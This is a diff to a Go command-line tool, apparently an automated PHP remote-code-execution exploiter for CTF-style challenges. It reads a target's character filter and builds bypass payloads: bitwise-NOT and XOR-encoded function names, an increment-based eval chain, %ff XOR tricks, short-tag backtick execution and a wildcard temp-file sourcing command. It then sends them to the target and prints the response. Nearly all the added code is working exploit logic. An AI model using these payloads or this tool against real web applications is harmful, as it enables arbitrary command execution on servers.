@@ -207,15 +207,15 @@ func Logo() {
 	
 ██████╗  ██████╗███████╗███╗   ███╗ █████╗ ██████╗ 
 ██╔══██╗██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗
-██████╔╝██║     █████╗  ██╔████╔██║███████║██████╔╝
-██╔══██╗██║     ██╔══╝  ██║╚██╔╝██║██╔══██║██╔═══╝ 
+██████╔╝██║     █████╗  ██╔████╔██║███████║██████╔╝			
+██╔══██╗██║     ██╔══╝  ██║╚██╔╝██║██╔══██║██╔═══╝ 			
 ██║  ██║╚██████╗███████╗██║ ╚═╝ ██║██║  ██║██║     
 ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝      
 	`
 
 	fmt.Printf(Logo + "\n")
 	fmt.Printf("\033[32m Author: Pr1nt \033[39m\n")
-	fmt.Printf("\033[32m Version: v0.3 \033[39m\n")
+	fmt.Printf("\033[32m Version: v0.4 \033[39m\n")
 
 }
 
@@ -234,9 +234,12 @@ func test(url string) {
 			return
 		}
 
-	} else {
-		fmt.Println("Invalid request method")
-		return
+	} else if m == "POST" {
+		response, err = http.Get(url)
+		if err != nil {
+			fmt.Println("Error creating GET request:", err)
+			return
+		}
 	}
 
 	defer response.Body.Close()
@@ -279,7 +282,7 @@ func test(url string) {
 			a_z := regexp.MustCompile(`a-z`)       // 匹配小写字母 a-z
 			zero_nine := regexp.MustCompile(`0-9`) // 匹配数字 0-9
 
-			if a_z.MatchString(guolv) || zero_nine.MatchString(guolv) { //其他情况等待施工中
+			if a_z.MatchString(guolv) && zero_nine.MatchString(guolv) { //其他情况等待施工中
 
 				//如果是无数字字母题目
 
@@ -292,28 +295,38 @@ func test(url string) {
 
 						fmt.Println(inf + "执行eval函数")
 						fmt.Println(inf + "普通无数字字母需要利用$，这里被过滤了，只能使用进阶版")
-						if !strings.Contains(guolv, "(") || !strings.Contains(guolv, ")") || !strings.Contains(guolv, "~") || !strings.Contains(guolv, ";") {
+						//无数字字母进阶的eval两种版本施工完毕
+						if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, ";") {
 							v = 7
-							noshuzievaljinjie(url) //无数字字母进阶的eval两种版本施工完毕
-						} else if !strings.Contains(guolv, ".") || !strings.Contains(guolv, "/") || !strings.Contains(guolv, "?") || !strings.Contains(guolv, "[") || !strings.Contains(guolv, "-") || !strings.Contains(guolv, "@") || !strings.Contains(guolv, "]") {
+							noshuzievaljinjie(url)
+						} else if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "`") {
+							v = 7
+							noshuzievaljinjie(url)
+						} else if !strings.Contains(guolv, ".") && !strings.Contains(guolv, "/") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "[") && !strings.Contains(guolv, "-") && !strings.Contains(guolv, "]") {
 							v = 5
 							noshuzievaljinjie(url)
 						} else {
-							fmt.Println(WARNING + "老弟你全给过滤了我咋做啊")
+							fmt.Println(WARNING + "老弟你全给过滤了我咋做啊(其实要么是你菜要么是我菜不会做要么是这题无解)")
 						}
 					} else {
 
-						fmt.Println(inf + "既然$没有被过滤，那么这里有自增异或两种方法")
+						fmt.Println(inf + "既然$没有被过滤，那么这里总共有三种方法")
 
-						if !strings.Contains(guolv, "^") || !strings.Contains(guolv, "$") || !strings.Contains(guolv, "(") || !strings.Contains(guolv, ")") || !strings.Contains(guolv, "'") || !strings.Contains(guolv, ".") || !strings.Contains(guolv, "_") || !strings.Contains(guolv, ";") || !strings.Contains(guolv, "[") || !strings.Contains(guolv, "]") {
+						if !strings.Contains(guolv, "^") && !strings.Contains(guolv, "$") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "'") && !strings.Contains(guolv, ".") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, ";") && !strings.Contains(guolv, "[") && !strings.Contains(guolv, "]") {
 							fmt.Println(inf + "可以使用异或")
 							xor(url)
-						} else if !strings.Contains(guolv, "$") || !strings.Contains(guolv, "_") || !strings.Contains(guolv, "+") || !strings.Contains(guolv, ";") || !strings.Contains(guolv, ".") {
-
+						} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, "+") && !strings.Contains(guolv, ";") && !strings.Contains(guolv, ".") {
 							fmt.Println(inf + "可以使用自增")
-							zizeng(url) //等待施工
-						}
+							zizeng(url)
 
+						} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "{") && !strings.Contains(guolv, "}") && !strings.Contains(guolv, "^") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, ";") {
+							fmt.Println(inf + "这是一种特殊的方法,利用%ff")
+							ff(url)
+
+						} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "{") && !strings.Contains(guolv, "}") && !strings.Contains(guolv, "^") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, "`") {
+							fmt.Println(inf + "当这个特殊方法中分号被过滤时只能使用短标签了")
+							ff(url)
+						}
 					}
 
 				} else if strings.Contains(string(cleanText), "system") {
@@ -335,7 +348,7 @@ func test(url string) {
 			break
 
 		} else if strings.Contains(cleanText, preg_replace) {
-			//replace过滤
+			//replace过滤等待施工中
 			fmt.Printf(inf+"发现过滤: %s\n", preg_replace)
 			fmt.Printf(inf + "题目源码如下: \n" + cleanText + "\n")
 			re := regexp.MustCompile(`(?i)preg_replace\("([^"]+)"`)
@@ -355,23 +368,199 @@ func test(url string) {
 			}
 			found = true
 			break
-			//等待施工中
 
+		} else {
+			fuzzpro(url)
+			//没源码的方法,fuzz一下出来之后匹配一下即可
 		}
 
 	}
 
 	if !found {
 		fmt.Println(WARNING + "未发现过滤")
-		fuzz(url)
+		fuzzpro(url)
 		//等待施工中
 	}
 
 }
 
-func zizeng(URL string) {
+// 差不多就剩这俩函数了，别的都写完了，zizeng（）是给无数字字母用的，fuzzpro是给黑名单和无源码题用的，俩函数解决全部，接下来先搞定zizeng，最后搞fuzzpro
+func fuzzpro(url string) {
 
 }
+
+/*
+
+后面是写完了的函数
+
+*/
+//该函数最少69个字符
+func zizeng(URL string) {
+	var c1 string
+	var c2 string
+	leftIndex := strings.Index(command, "(")
+	if leftIndex == -1 {
+		// 字符串中没有左括号
+		c1 = command
+		c2 = ""
+		fmt.Println(WARNING + "字符串中没有左括号")
+	}
+
+	// 查找第一个右括号的索引
+	rightIndex := strings.Index(command, ")")
+	if rightIndex == -1 {
+		// 字符串中没有右括号
+		c1 = ""
+		c2 = ""
+		fmt.Println(WARNING + "字符串中没有右括号")
+	}
+
+	if leftIndex < rightIndex {
+		// 括号正确匹配，提取括号内外的内容
+		//c1是括号外内容，c2是括号内内容
+		c1 = command[:leftIndex]
+		c2 = command[leftIndex+1 : rightIndex]
+
+	} else {
+		// 括号不正确匹配
+		c1 = command
+		c2 = ""
+		fmt.Println(WARNING + "括号不正确匹配")
+	}
+	payload := []byte(i + "=" + "$_=(%ff/%ff.%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&_POST=" + c1 + "&_=" + c2)
+
+	// 发起 POST 请求
+	resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
+	if err != nil {
+		fmt.Println("发送 POST 请求失败:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// 读取响应
+	respBody, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("读取响应失败:", err)
+		return
+	}
+
+	// 输出响应
+	fmt.Printf(inf+"POC为: %s\n", payload)
+	fmt.Printf(inf+"回显为: %s\n", removeHTMLTags(string(respBody)))
+
+}
+
+func ff(URL string) {
+	var xorresult string
+	var result2 string
+	var ffCount string
+
+	//下面是对comman命令切片然后有括号的话提取括号内内容
+	var c1 string
+	var c2 string
+	leftIndex := strings.Index(command, "(")
+	if leftIndex == -1 {
+		// 字符串中没有左括号
+		c1 = command
+		c2 = ""
+	}
+
+	// 查找第一个右括号的索引
+	rightIndex := strings.Index(command, ")")
+	if rightIndex == -1 {
+		// 字符串中没有右括号
+		c1 = ""
+		c2 = ""
+	}
+
+	if leftIndex < rightIndex {
+		// 括号正确匹配，提取括号内外的内容
+		//c1是括号外内容，c2是括号内内容
+		c1 = command[:leftIndex]
+		c2 = command[leftIndex+1 : rightIndex]
+
+	} else {
+		// 括号不正确匹配
+		c1 = command
+		c2 = ""
+	}
+	var ff string
+	var reURL string
+
+	//遍历异或
+	for _, char := range c2 {
+		ffCount = strings.Repeat("%ff", len(c2)) //数数有几个字符需要与%ff进行异或
+
+		for a := 0; a <= 15; a++ {
+			hexa := fmt.Sprintf("%X", a)
+			for b := 0; b <= 15; b++ {
+				hexb := fmt.Sprintf("%X", b)
+				result := "%" + hexa + hexb
+				decoded, err := url.QueryUnescape(result)
+				if err != nil {
+					fmt.Printf("解码错误: %v\n", err)
+					return
+				}
+				ff, err := url.QueryUnescape("%ff")
+				if err != nil {
+					fmt.Printf("解码错误: %v\n", err)
+					return
+				}
+
+				xorresult = ""
+				for i := 0; i < len(decoded); i++ {
+					xorresult += string(decoded[i] ^ ff[i%len(ff)])
+				}
+				if xorresult == string(char) {
+					result2 += result
+				}
+			}
+		}
+	}
+
+	ff = ffCount + "^" + result2
+	//ff是对c2进行异或得到的（c2是例如system（ipconfig）中的ipconfig）
+
+	ff2 := "${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('" + ff + "');"
+
+	//输出异或结果（POC）
+
+	fmt.Printf(inf+"POC为: %s\n", ff2)
+
+	//判断不同过滤打不一样的POC
+
+	if !strings.Contains(guolv, "^") && !strings.Contains(guolv, ";") {
+
+		reURL = URL + "?" + i + "=" + ff2 + "&%ff=" + c1
+
+	} else if !strings.Contains(guolv, "~") && strings.Contains(guolv, ";") {
+
+		reURL = URL + "?" + i + "=" + "?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=" + c2
+
+	} else if !strings.Contains(guolv, "~") && !strings.Contains(guolv, ";") {
+
+		reURL = URL + "?" + i + "=" + "${~%A0%B8%BA%AB}{%ff}(~" + qufan(c2) + ");&%ff=" + c1
+
+	} else if !strings.Contains(guolv, "^") && strings.Contains(guolv, ";") {
+
+		reURL = URL + "?" + i + "=" + "?><?=`" + ff + "`?>"
+
+	}
+
+	fmt.Printf(inf+"请求URl为: %s\n", reURL)
+
+	res, err := http.Get(reURL)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer res.Body.Close()
+
+	body, err := ioutil.ReadAll(res.Body)
+
+	REres := removeHTMLTags(string(body))
+	fmt.Printf(inf+"回显为: %s \n", REres)
+}
+
 func xor(URL string) {
 	var newURL string
 	var payload string
@@ -443,7 +632,7 @@ func noshuzievaljinjie(url string) {
 		c1 = command[:leftIndex]
 		c2 = command[leftIndex+1 : rightIndex]
 
-		c2 = qufan(c2)
+		c2 = qufan(c2) //对括号内系统命令取反
 
 		c3 = "~" + c2
 
@@ -455,15 +644,21 @@ func noshuzievaljinjie(url string) {
 	var rec string
 	if v == 7 {
 		fmt.Println(inf + "PHP版本为7.x")
-
+		fmt.Printf(inf + "可以使用取反来解决")
 		POC := qufan(c1)
+		if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, ";") {
+			command = "(~" + POC + ")(" + c3 + ");"
+			fmt.Printf(inf+"POC为: %s\n", command)
 
-		command = "(~" + POC + ")(" + c3 + ");"
-		fmt.Printf(inf+"POC为: %s\n", command)
+		} else if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "`") {
+			fmt.Printf("\033[33m" + "[Tips] " + "\033[39m" + "这里只能执行system命令")
+			command = "?><?=`(" + c3 + ")`?>"
+			fmt.Printf(inf+"POC为: %s\n", command)
+		}
 
 	} else if v == 5 {
 		fmt.Println(inf + "PHP版本为5.x")
-		rec = "?><?=`. /???/????????[@-[]`;?>"
+		rec = "?><?=`. /???/????????[?-[]`;?>"
 		m = "POST"
 	}
 
@@ -529,8 +724,9 @@ func noshuzievaljinjie(url string) {
 		}
 
 		// 输出响应
-		fmt.Println("POST 请求响应:")
-		fmt.Println(string(respBody))
+		fmt.Println()
+		fmt.Printf(inf+"回显为: %s\n", removeHTMLTags(string(respBody)))
+
 	}
 
 }
